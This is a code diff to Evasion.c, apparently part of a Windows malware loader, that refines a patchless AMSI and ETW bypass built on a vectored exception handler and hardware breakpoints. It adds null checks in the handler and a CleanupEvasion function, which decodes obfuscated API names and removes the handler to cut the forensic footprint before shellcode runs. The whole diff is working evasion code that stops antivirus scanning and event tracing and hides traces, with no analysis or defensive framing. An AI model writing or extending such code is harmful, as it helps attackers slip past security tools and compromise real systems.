@@ -2,6 +2,7 @@
 // Evasion.c - Patchless AMSI/ETW Bypass
 //             (VEH + Hardware Breakpoints + NtContinue)
 //             Anti-Analysis
+//             Post-execution Cleanup
 // =============================================
 
 #include "Common.h"
@@ -9,6 +10,9 @@
 // Global target addresses for VEH handler
 static PVOID g_pEtwEventWrite   = NULL;
 static PVOID g_pAmsiScanBuffer  = NULL;
+
+// VEH handle for cleanup
+static PVOID g_hVeh = NULL;
 
 // Guard flag: prevents infinite NtContinue loop
 static volatile BOOL g_bHwBpSet = FALSE;
@@ -29,7 +33,7 @@ static LONG WINAPI HwBpVehHandler(PEXCEPTION_POINTERS pExInfo) {
     PCONTEXT ctx = pExInfo->ContextRecord;
 
     // EtwEventWrite hit -> return STATUS_SUCCESS (0)
-    if (ctx->Rip == (ULONG_PTR)g_pEtwEventWrite) {
+    if (g_pEtwEventWrite && ctx->Rip == (ULONG_PTR)g_pEtwEventWrite) {
         ctx->Rax = 0;
         ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
         ctx->Rsp += sizeof(ULONG_PTR);
@@ -38,7 +42,7 @@ static LONG WINAPI HwBpVehHandler(PEXCEPTION_POINTERS pExInfo) {
 
     // AmsiScanBuffer hit -> return E_INVALIDARG
     // Callers that check HRESULT will skip the scan result entirely
-    if (ctx->Rip == (ULONG_PTR)g_pAmsiScanBuffer) {
+    if (g_pAmsiScanBuffer && ctx->Rip == (ULONG_PTR)g_pAmsiScanBuffer) {
         ctx->Rax = 0x80070057;  // E_INVALIDARG
         ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
         ctx->Rsp += sizeof(ULONG_PTR);
@@ -115,7 +119,8 @@ BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi) {
 
     // --- Register VEH (first handler in chain) ---
 
-    if (!pRtlAddVeh(1, (PVOID)HwBpVehHandler))
+    g_hVeh = pRtlAddVeh(1, (PVOID)HwBpVehHandler);
+    if (!g_hVeh)
         return FALSE;
 
     LOG("[+] Patchless: VEH registered");
@@ -148,6 +153,43 @@ BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi) {
 
     LOG("[+] Patchless: HW breakpoints set (DR0=ETW, DR1=AMSI)");
     return TRUE;
+}
+
+// -----------------------------------------------
+// Cleanup Evasion State
+//
+// Removes VEH handler and clears target addresses.
+// Called before shellcode execution to reduce
+// forensic footprint in memory.
+// -----------------------------------------------
+VOID CleanupEvasion(IN PAPI_HASHING pApi) {
+
+    if (!g_hVeh || !pApi)
+        return;
+
+    // Resolve RtlRemoveVectoredExceptionHandler
+    BYTE xNtdll[] = XSTR_NTDLL_DLL;
+    DEOBF(xNtdll);
+    PVOID pNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
+    if (!pNtdll)
+        return;
+
+    BYTE xRemVeh[] = XSTR_RTL_REMOVE_VEH;
+    DEOBF(xRemVeh);
+    fnRtlRemoveVectoredExceptionHandler pRtlRemoveVeh =
+        (fnRtlRemoveVectoredExceptionHandler)pApi->pGetProcAddress(
+            (HMODULE)pNtdll, (LPCSTR)xRemVeh);
+
+    if (pRtlRemoveVeh)
+        pRtlRemoveVeh(g_hVeh);
+
+    // Clear all evasion state
+    g_hVeh             = NULL;
+    g_pEtwEventWrite   = NULL;
+    g_pAmsiScanBuffer  = NULL;
+    g_bHwBpSet         = FALSE;
+
+    LOG("[+] Evasion cleanup: VEH removed, state cleared");
 }
 
 // -----------------------------------------------
